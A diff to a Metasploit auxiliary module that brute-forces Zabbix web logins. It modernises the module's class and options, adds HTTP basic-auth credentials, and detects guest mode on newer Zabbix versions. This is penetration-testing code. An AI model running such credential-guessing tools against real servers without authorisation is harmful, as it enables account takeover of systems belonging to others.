@@ -1,14 +1,12 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'metasploit/framework/login_scanner/zabbix'
 require 'metasploit/framework/credential_collection'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Report
@@ -29,11 +27,13 @@ class Metasploit3 < Msf::Auxiliary
       'License'        => MSF_LICENSE
     )
 
+    deregister_options('PASSWORD_SPRAY')
+
     register_options(
       [
         Opt::RPORT(80),
         OptString.new('TARGETURI', [ true,  'The path to the Zabbix server application', '/zabbix/']),
-      ], self.class)
+      ])
   end
 
   #
@@ -52,7 +52,7 @@ class Metasploit3 < Msf::Auxiliary
     if is_guest_mode_enabled?
       print_brute :level => :good, :ip => ip, :msg => "Note: This Zabbix instance has Guest mode enabled"
     else
-      print_brute :level=>:status, :ip=>rhost, :msg=>("Zabbix has disabled Guest mode")
+      print_brute :level=>:status, :ip=>rhost, :msg=>("This Zabbix instance has disabled Guest mode")
     end
 
     bruteforce(ip)
@@ -131,14 +131,9 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def init_loginscanner(ip)
-    @cred_collection = Metasploit::Framework::CredentialCollection.new(
-      blank_passwords: datastore['BLANK_PASSWORDS'],
-      pass_file:       datastore['PASS_FILE'],
-      password:        datastore['PASSWORD'],
-      user_file:       datastore['USER_FILE'],
-      userpass_file:   datastore['USERPASS_FILE'],
-      username:        datastore['USERNAME'],
-      user_as_pass:    datastore['USER_AS_PASS']
+    @cred_collection = build_credential_collection(
+      username: datastore['USERNAME'],
+      password: datastore['PASSWORD']
     )
 
     # Always try the default first
@@ -153,6 +148,8 @@ class Metasploit3 < Msf::Auxiliary
         stop_on_success:    datastore['STOP_ON_SUCCESS'],
         bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],
         connection_timeout: 5,
+        http_username:      datastore['HttpUsername'],
+        http_password:      datastore['HttpPassword']
       )
     )
   end
@@ -168,7 +165,19 @@ class Metasploit3 < Msf::Auxiliary
   def is_guest_mode_enabled?
     dashboard_uri = normalize_uri(datastore['TARGETURI'] + '/' + 'dashboard.php')
     res = send_request_cgi({'uri'=>dashboard_uri})
-    !! (res && res.code == 200 && res.body.to_s =~ /<title>Zabbix .*: Dashboard<\/title>/)
+    if (res && res.code == 200 && res.body.to_s =~ /<title>.*: Dashboard<\/title>/)
+      return true
+    else # Otherwise target is most likely a newer version of Zabbix, so lets try the updated URL.
+      dashboard_uri = normalize_uri(datastore['TARGETURI'] + '/' + 'zabbix.php')
+      res = send_request_cgi({
+        'uri' => dashboard_uri,
+        'vars_get' => { 'action' => 'dashboard.view' }
+      })
+      if (res && res.code == 200 && res.body.to_s =~ /<title>.*: Dashboard<\/title>/)
+        return true
+      else
+        return false
+      end
+    end
   end
-
 end
